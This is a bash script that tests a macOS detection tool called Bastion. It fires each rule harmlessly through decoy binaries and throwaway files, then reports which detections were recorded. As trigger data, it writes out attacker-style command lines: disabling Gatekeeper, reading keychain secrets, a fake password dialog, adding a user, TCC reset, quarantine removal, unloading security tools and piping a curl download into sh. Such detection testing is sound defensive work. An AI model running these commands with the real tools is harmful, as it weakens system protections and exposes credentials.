#!/usr/bin/env bash
# Fire every Bastion detection once, harmlessly, and check each one was recorded.
#
# Nothing here changes your system, apart from restarting osquery once. Process rules
# are triggered by "decoys": copies of /usr/bin/true named after the real tool (spctl,
# security, osascript...). The detection sees the command line it watches for, but the
# decoy does nothing. File rules use throwaway files that are deleted afterwards. The
# launch agent plist is never loaded.
#
#   ./scripts/test-triggers.sh            run all triggers, wait, report PASS/MISS
#   ./scripts/test-triggers.sh --no-wait  fire triggers only (check later with
#                                         sudo bastion detections --since <start>)
#
# Expect BlockBlock to pop up about com.bastiontest.decoy.plist: that's it working.
# Click Allow (or Block; the file is deleted at the end either way).
set -euo pipefail

WAIT=1
[[ "${1:-}" == "--no-wait" ]] && WAIT=0
[[ "$(uname -s)" == "Darwin" ]] || { echo "Run this on your Mac."; exit 1; }
[[ $EUID -ne 0 ]] || { echo "Run as yourself, not root (it asks for sudo when needed)."; exit 1; }

REPO="$(cd "$(dirname "$0")/.." && pwd)"
D="$REPO/build/decoys"
[[ "$D" != *" "* ]] || { echo "Move the repo to a path without spaces first."; exit 1; }
START=$(date +%s)
STAMP=$(date +%Y%m%d-%H%M)
TMPD="/private/tmp/bastion-test-$$"
HIDDEN="$HOME/.bastion-test"
DL="$HOME/Downloads/bastion-test-payload"
PLIST="$HOME/Library/LaunchAgents/com.bastiontest.decoy.plist"
CRED="$HOME/.ssh/id_bastion_test"
MADE_SSH=0
PROFILE=""

say() { printf '\033[1m==> %s\033[0m\n' "$*"; }

cleanup() {
  rm -rf "$TMPD" "$HIDDEN" "$DL" "$PLIST" "$CRED"
  [[ -n "$PROFILE" ]] && rm -f "$PROFILE"
  [[ $MADE_SSH -eq 1 ]] && rmdir "$HOME/.ssh" 2>/dev/null
  return 0
}
trap cleanup EXIT

say "sudo is needed once, to read Bastion's detections at the end"
sudo -v

# A do-nothing binary, ad-hoc signed so it isn't an Apple platform binary.
make_decoy() {  # make_decoy SOURCE DEST
  mkdir -p "$(dirname "$2")"
  cp "$1" "$2"
  codesign -f -s - "$2" 2>/dev/null
}
mkdir -p "$D"
for tool in spctl security osascript sysadminctl tccutil xattr launchctl curl; do
  make_decoy /usr/bin/true "$D/$tool"
done
make_decoy /bin/cat "$D/reader"

say "Process rules (decoys only)"
"$D/spctl" --master-disable
"$D/security" find-generic-password -s bastion-test -w
"$D/osascript" -e 'display dialog "Bastion test" default answer "" with hidden answer'
"$D/sysadminctl" -addUser bastiontest
"$D/tccutil" reset All com.bastiontest.decoy
"$D/xattr" -d com.apple.quarantine /private/tmp/bastion-test-nonexistent
"$D/launchctl" bootout system/com.bastiontest.notreal
sh -c "$D/curl -s https://example.invalid | sh"     # one command line with the pipe
"$D/curl" -s https://example.invalid | sh             # typed-pipe correlation

say "Execution-location rules (ad-hoc signed copies of /usr/bin/true)"
make_decoy /usr/bin/true "$TMPD/payload";  "$TMPD/payload"
make_decoy /usr/bin/true "$HIDDEN/payload"; "$HIDDEN/payload"
make_decoy /usr/bin/true "$DL";            "$DL"

say "File rules (throwaway files)"
if [[ ! -d "$HOME/.ssh" ]]; then mkdir -m 700 "$HOME/.ssh"; MADE_SSH=1; fi
printf 'not a real key\n' > "$CRED"
for f in .zlogin .bash_profile .profile .bashrc; do
  if [[ ! -e "$HOME/$f" ]]; then PROFILE="$HOME/$f"; break; fi
done
[[ -n "$PROFILE" ]] && : > "$PROFILE"
# osquery decides which files to watch when it loads its config, so files created after
# that aren't watched yet (issues log #24). Restart it so the test files are covered,
# the way a real ~/.zshrc or SSH key that already exists is.
say "Restarting osquery so it watches the test files (about 20 s)"
sudo launchctl kickstart -k system/io.osquery.agent
sleep 20
"$D/reader" "$CRED" >/dev/null
if [[ -n "$PROFILE" ]]; then
  printf '# bastion test\n' >> "$PROFILE"
else
  echo "    skipped shell profile test: all candidate files already exist"
fi
mkdir -p "$(dirname "$PLIST")"
cat > "$PLIST" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.bastiontest.decoy</string>
  <key>ProgramArguments</key><array><string>/usr/bin/true</string></array>
  <key>RunAtLoad</key><false/>
</dict></plist>
EOF

EXPECTED=(
  "Gatekeeper Disabled With spctl"
  "Keychain Secrets Read With the security CLI"
  "AppleScript Dialog Asking for a Password"
  "Local Account Created or Added to the Admin Group"
  "Privacy Permission (TCC) Database Tampering"
  "Quarantine Attribute Removed From a File"
  "Attempt to Stop or Unload a Security Tool"
  "Download Piped Into a Shell"
  "Download piped into a shell (interactive)"
  "Execution From a Temporary or Shared Folder"
  "Binary Executed From a Hidden Folder in the Home Directory"
  "Unsigned or Ad-hoc Signed Binary Run From a Download Folder"
  "Credential Store Opened by an Unexpected Process"
  "LaunchAgent or LaunchDaemon Property List Written"
  "New LaunchAgent, LaunchDaemon or Login Item"
)
[[ -n "$PROFILE" ]] && EXPECTED+=("Shell Startup File Modified")

if [[ $WAIT -eq 0 ]]; then
  say "Triggers fired. Check in ~6 minutes with: sudo bastion detections --since $START"
  trap - EXIT
  echo "    (leaving the test plist in place so osquery's launchd scan can see it;"
  echo "     delete it afterwards: rm $PLIST)"
  rm -rf "$TMPD" "$HIDDEN" "$DL" "$CRED"
  [[ -n "$PROFILE" ]] && rm -f "$PROFILE"
  exit 0
fi

# osquery checks launch items every 5 minutes, so the persistence rule takes longest.
say "Waiting for every detection (up to 7 minutes)..."
found=""
for _ in $(seq 1 28); do
  sleep 15
  found="$(sudo /usr/local/bin/bastion detections --since "$START" --json)"
  missing=0
  for t in "${EXPECTED[@]}"; do
    grep -qF "\"title\": \"$t\"" <<<"$found" || missing=$((missing + 1))
  done
  [[ $missing -eq 0 ]] && break
done

mkdir -p "$REPO/reports"
OUT="$REPO/reports/test-triggers-$STAMP.md"
{
  echo "# Bastion trigger test ($STAMP)"
  echo
  echo "| Result | Detection |"
  echo "| --- | --- |"
  for t in "${EXPECTED[@]}"; do
    if grep -qF "\"title\": \"$t\"" <<<"$found"; then echo "| PASS | $t |"
    else echo "| MISS | $t |"; fi
  done
} > "$OUT"
cat "$OUT"
echo
echo "Saved to $OUT. Every PASS is now a labeled true positive."
if grep -q "| MISS |" "$OUT"; then exit 1; fi
